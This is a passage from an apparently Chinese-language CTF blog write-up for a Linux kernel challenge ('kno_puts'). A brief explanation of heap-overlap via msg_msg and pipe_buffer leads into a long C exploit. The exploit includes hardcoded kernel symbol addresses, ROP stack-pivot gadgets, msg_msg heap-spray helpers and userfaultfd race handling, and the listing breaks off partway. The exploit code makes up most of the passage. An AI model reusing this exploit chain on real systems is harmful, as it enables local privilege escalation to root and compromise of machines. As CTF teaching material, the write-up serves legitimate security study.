<code>free_msg</code> 对 <code>next</code> 指针的遍历），所以当我们读取 <code>msg_msg</code> 的数据泄露内核地址后 <code>msg_msg + 0x300</code> 会被当成一个堆块进行释放，最终堆的布局会变成下面这种情况：</p><img src="/2024/10/07/kno_puts/7.png" class="" title="我的图图呢">  <p>可以看见出现了叠堆，也就是说我们可以再次申请 <code>0x400</code> 的 <code>object</code> 就能修改到下方的 <code>pipe_buffer</code>。接下来就是一条龙服务了，修改 <code>ops</code> 然后两次栈迁移打 <code>kernel rop</code>。这里我为什么没用 <code>tty_struct</code> 呢？因为当我使用 <code>tty_struct</code> 时，我叠堆修改 <code>tty_struct</code> 时前 <code>8</code> 字节必须为空，否则就会 <code>kernel panice</code>，可是改 <code>pipe_buffer</code> 时前 <code>8</code> 字节确可以有数据。我们都知道，<code>tty_struct</code> 前 <code>8</code> 字节是魔术字 <code>0x100005401</code>，如果改字段损坏 <code>tty_struct</code> 就不会执行他虚表上的函数，也就是说我们无法控制程序流。所以到底为什么会 <code>panic</code>😇，如果有师傅知道原因可以加笔者微信或 QQ 教教鼠鼠😭</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> magic_gadget = <span class="number">0xffffffff81599a34</span>;</span><br><span class="line"><span class="comment">// 0xffffffff81599a34: push rsi; pop rsp; setl al; shl eax, 2; ret;</span></span><br><span class="line"><span class="type">size_t</span> add_rsp = <span class="number">0xffffffff81371a49</span>;</span><br><span class="line"><span class="comment">// 0xffffffff81371a49: add rsp, 8; pop rbx; pop r12; pop rbp; ret;</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"><span class="type">size_t</span> ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> msg_qid;</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"><span class="type">char</span> msg_buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">getMsgQueue</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp,</span><br><span class="line">                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">              <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts,  <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span>&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span 